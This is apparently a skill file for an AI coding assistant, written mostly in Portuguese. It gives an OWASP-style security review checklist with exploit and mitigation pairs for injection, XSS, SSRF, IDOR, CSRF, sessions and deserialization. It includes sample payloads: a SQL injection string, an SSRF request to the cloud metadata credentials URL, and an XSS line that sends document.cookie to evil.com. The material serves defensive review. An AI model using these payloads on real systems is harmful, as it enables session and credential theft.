---
name: security-review-checklist
description: Broad OWASP-style security sweep of a PR or release — injection, XSS, SSRF, IDOR/broken access control, CSRF, insecure deserialization. Stack-agnostic checklist with exploit/mitigation pairs; per-area deep dives are delegated to the dedicated skills (auth-patterns, dependency-audit, secrets-management, input-validation, multi-tenant-isolation-audit). Use when user asks for a security review, OWASP checklist, vulnerability audit of a PR/diff, or mentions injection, XSS, SSRF, IDOR, CSRF.
---

# Security Review Checklist

Checklist de revisão de segurança pra código/PR, organizado por classe de vulnerabilidade — não por stack. O exemplo de exploit/mitigação muda entre Next.js, NestJS, Python, Java, Go, Ruby, .NET; a pergunta de auditoria ("esse dado hostil chega aqui sem barreira?") não muda.

Cruza com `input-validation` (injection e XSS nascem de dado não validado na borda), `multi-tenant-isolation-audit` (IDOR entre tenants/owners tem skill dedicada, mais profunda), `auth-patterns` (falhas de autenticação/sessão têm skill dedicada, mais profunda), `dependency-audit` (dependências vulneráveis têm skill dedicada, mais profunda) e `secrets-management` (segredos expostos têm skill dedicada, mais profunda). Aqui o foco é a varredura ampla de uma revisão de PR.

## Como revisar

1. Identificar toda borda que recebe dado hostil no diff: request HTTP, query param, header, cookie, upload, mensagem de fila, resposta de API externa, input de CLI.
2. Pra cada borda, percorrer as categorias abaixo perguntando "esse fluxo específico é afetado?".
3. Achou um item sem mitigação → reportar com exploit concreto, não só "está inseguro".
4. Nem toda categoria se aplica a todo PR — pular rápido as que não têm superfície.

## Injection (SQL / NoSQL / Command / LDAP)

Dado externo vira parte de um comando interpretado (query, shell, filtro LDAP) em vez de permanecer dado.

```
❌ query = "SELECT * FROM users WHERE email = '" + input + "'"
   input = "' OR '1'='1"  →  retorna todos os usuários

✅ query = "SELECT * FROM users WHERE email = $1"; db.query(query, [input])
   -- parametrização: input nunca vira parte do texto do comando
```

- [ ] Toda query usa parametrização/prepared statement — nunca concatenação ou interpolação de string com dado externo
- [ ] ORM/query builder não tem escape hatch (`.raw()`, `$where`, string template) recebendo input não sanitizado
- [ ] Comando de shell (`exec`, `spawn`, `os.system`) nunca monta argumento por concatenação de input — usa array de argumentos ou allowlist
- [ ] Filtro LDAP/XPath escapa caractere especial do input antes de montar a expressão
- [ ] Mensagem de erro de banco não é repassada crua ao client (vaza schema/query)

## Cross-Site Scripting (XSS)

Dado externo é renderizado como HTML/JS executável no browser de outro usuário.

```
❌ <div dangerouslySetInnerHTML={{ __html: comment.text }} />
   comment.text = "<img src=x onerror=fetch('//evil.com?c='+document.cookie)>"

✅ <div>{comment.text}</div>  // JSX escapa por padrão
   // se precisar HTML: sanitizar com allowlist de tags (ex: DOMPurify) antes de renderizar
```

- [ ] Renderização de dado de usuário usa escaping automático do framework (JSX, Blade `{{ }}`, Django autoescape) — nenhum `dangerouslySetInnerHTML`/`| safe`/`Html.Raw` sem sanitização explícita antes
- [ ] Sanitização de HTML rico usa allowlist de tags/atributos (biblioteca dedicada), não regex caseira
- [ ] Atributos dinâmicos (`href`, `src`, `style`) não aceitam `javascript:`/`data:` vindo de input sem validação de esquema
- [ ] Resposta de API que será interpretada por outro sistema (JSON embutido em `<script>`, e-mail HTML) escapa pro contexto certo, não só HTML
- [ ] Cookies de sessão marcados `HttpOnly` — script injetado não consegue ler o token mesmo se o XSS existir

## SSRF (Server-Side Request Forgery)

Servidor faz requisição de rede pra um destino controlado (total ou parcialmente) pelo atacante.

```
❌ const res = await fetch(req.body.imageUrl); // busca avatar de URL arbitrária
   imageUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
   → vaza credenciais da cloud

✅ validar host contra allowlist de domínios permitidos antes de buscar;
   bloquear ranges internos/link-local (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, ::1)
   mesmo depois de resolver DNS (não só checar a string da URL)
```

- [ ] Toda função que busca URL fornecida por usuário (webhook de saída, fetch de imagem/link preview, importação por URL) valida o host contra allowlist
- [ ] Validação de host acontece após resolução de DNS, não só na string (evita bypass por redirect ou DNS rebinding)
- [ ] IP ranges internos/metadata da cloud (link-local, loopback, RFC1918) bloqueados por padrão nesse tipo de chamada
- [ ] Redirect HTTP (3xx) da requisição de saída não é seguido cegamente pra fora da allowlist
- [ ] Timeout e limite de tamanho de resposta configurados (evita usar o servidor como proxy de exfiltração/DoS)

## IDOR / Broken Access Control

Recurso é identificado por ID previsível e o servidor não confere se quem pede tem permissão sobre ele — ver `multi-tenant-isolation-audit` pro caso específico de cross-tenant/cross-owner.

```
❌ GET /api/invoices/42  →  retorna a invoice 42 pra qualquer usuário autenticado
   (autenticação checada, autorização sobre o recurso específico não)

✅ GET /api/invoices/42  →  handler carrega a invoice E confere
   invoice.ownerId === session.userId antes de retornar (senão 403/404)
```

- [ ] Todo endpoint que recebe ID de recurso confere posse/permissão do usuário autenticado sobre aquele recurso específico, não só que ele está logado
- [ ] IDs sequenciais previsíveis não são a única barreira — tentar `id+1`/`id-1` autenticado como outro usuário é parte do teste
- [ ] Ações de escrita (update/delete) repetem a mesma checagem de posse que a leitura — comum checar só no GET
- [ ] Autorização é verificada no backend (ou RLS), não inferida de o botão estar oculto no frontend
- [ ] Mudança de papel/role em runtime (upgrade de plano, admin toggle) invalida sessão/token antigo com permissão anterior

## CSRF

Ação de estado (mudar senha, transferir, deletar) executada por request forjado a partir de outro site, aproveitando sessão já autenticada do usuário.

```
❌ <form action="/api/transfer" method="POST"> só valida cookie de sessão
   → site malicioso monta form igual e submete no browser da vítima já logada

✅ Requer token CSRF (ou header custom que browser não replica cross-origin)
   além do cookie, validado no servidor a cada request de mutação
```

- [ ] Toda rota que muda estado (POST/PUT/PATCH/DELETE) autenticada por cookie exige token CSRF ou equivalente (header custom checado no servidor)
- [ ] Cookie de sessão usa `SameSite=Lax` ou `Strict` como camada adicional
- [ ] APIs autenticadas por header `Authorization: Bearer` (não por cookie) documentadas como fora desse risco — CSRF depende de credencial automática do browser

## Autenticação e Sessão

```
❌ Token de sessão em localStorage, sem expiração, sem rotação após login
❌ Mensagem de erro de login diferencia "usuário não existe" de "senha errada" (enumeração)
✅ Sessão expira, é invalidada no logout/troca de senha, e erro de login é genérico
```

- [ ] Erro de login não revela se o usuário existe (mensagem genérica: "credenciais inválidas")
- [ ] Rate limit / backoff em endpoint de login, reset de senha e 2FA
- [ ] Token de sessão expira, é invalidado no logout e na troca de senha
- [ ] Reset de senha usa token de uso único com expiração curta, não previsível
- [ ] Senha nunca logada, nem em texto plano nem em log de erro/stack trace

## Deserialização e Upload

```
❌ pickle.loads(request_body)  // deserialização de objeto arbitrário do client
   → execução de código ao desserializar payload malicioso

✅ Formato de troca é dado puro (JSON/schema validado), nunca objeto serializado
   da linguagem; deserializadores nativos (pickle, Java Serializable, PHP unserialize)
   nunca recebem input do client sem allowlist de tipo
```

- [ ] Payload externo nunca passa por deserializador nativo da linguagem (pickle, `unserialize`, `ObjectInputStream`, `BinaryFormatter`) sem allowlist de tipo
- [ ] Upload de arquivo valida tipo real (magic bytes) e roda fora do diretório servido publicamente — ver `input-validation`
- [ ] Nome de arquivo de upload é normalizado/gerado pelo servidor, nunca path vindo do client sem sanitização (bloqueia path traversal `../../`)

## Configuração e Dependências

```
❌ Stack trace completo, versão de framework e variável de ambiente no response de erro
❌ Dependência com CVE conhecida sem processo de atualização
✅ Erro genérico ao client, detalhe completo só em log interno
✅ Scan de dependências (SCA) rodando em CI, com política de atualização de CVE crítico
```

- [ ] Resposta de erro em produção não expõe stack trace, versão de framework/lib ou variável de ambiente
- [ ] Segredos (chave de API, connection string, JWT secret) vêm de variável de ambiente/secret manager, nunca hardcoded no repositório
- [ ] Scan de dependências (SCA) rodando em CI com processo definido pra CVE crítico
- [ ] Headers de segurança configurados (CSP, `X-Content-Type-Options`, `Strict-Transport-Security`) no ponto de entrada HTTP
- [ ] CORS não usa `Access-Control-Allow-Origin: *` combinado com `Allow-Credentials: true`

## Anti-patterns

- ❌ Concatenar/interpolar input em query, comando de shell ou filtro LDAP em vez de usar parametrização
- ❌ `dangerouslySetInnerHTML`/`| safe`/`Html.Raw` em dado de usuário sem sanitização por allowlist
- ❌ Buscar URL fornecida pelo client sem validar host contra allowlist e sem bloquear IP interno/metadata
- ❌ Checar apenas autenticação ("está logado?") e nunca autorização ("pode acessar ESTE recurso?") em endpoint com ID
- ❌ Rota de mutação autenticada só por cookie, sem token CSRF nem `SameSite`
- ❌ Mensagem de erro de login/cadastro que revela se o usuário existe
- ❌ Deserializar objeto nativo da linguagem a partir de payload do client
- ❌ Expor stack trace, versão de dependência ou variável de ambiente em erro de produção
- ❌ Segredo hardcoded no código-fonte em vez de variável de ambiente/secret manager
- ❌ CORS com origem wildcard (`*`) junto de credenciais habilitadas
- ❌ Confiar só em checagem manual de `ownerId` no código quando o banco (RLS) poderia garantir o isolamento na origem

## Exemplos por stack

**Next.js/React ou Vite+Supabase (XSS + SSRF):**
```tsx
// ❌ renderiza HTML de comentário sem sanitizar
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
// ✅ sanitiza com allowlist antes de renderizar
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.body, allowedTags) }} />

// route handler que busca preview de link — valida host antes do fetch
const url = new URL(input);
if (!isAllowedHost(url.hostname) || isPrivateIp(await resolve(url.hostname))) {
  return Response.json({ error: 'host não permitido' }, { status: 400 });
}
```

**NestJS/TypeORM (Injection + IDOR):**
```ts
// ✅ parametrização via query builder, nunca string concatenada
await this.repo.createQueryBuilder('invoice')
  .where('invoice.id = :id AND invoice.ownerId = :ownerId', { id, ownerId: user.id })
  .getOne(); // ownerId sempre da sessão, nunca do param — resolve IDOR e injection juntos
```

**Supabase/Postgres (IDOR via RLS em vez de checagem manual):**
```sql
-- ✅ a policy já resolve IDOR no nível do banco — endpoint nem precisa checar ownerId manualmente
CREATE POLICY "owner_own_invoices" ON invoices
  FOR SELECT TO authenticated
  USING (owner_id = auth.uid());
```

**Python/Django (SSRF + Deserialização):**
```python
# ❌ pickle em payload do client
data = pickle.loads(request.body)

# ✅ JSON validado por schema (Pydantic/DRF serializer), sem deserializador nativo
data = WebhookPayload(**json.loads(request.body))

# SSRF: valida host resolvido, não só a string da URL
import socket, ipaddress
ip = socket.gethostbyname(urlparse(target).hostname)
if ipaddress.ip_address(ip).is_private:
    raise ValidationError("host interno bloqueado")
```
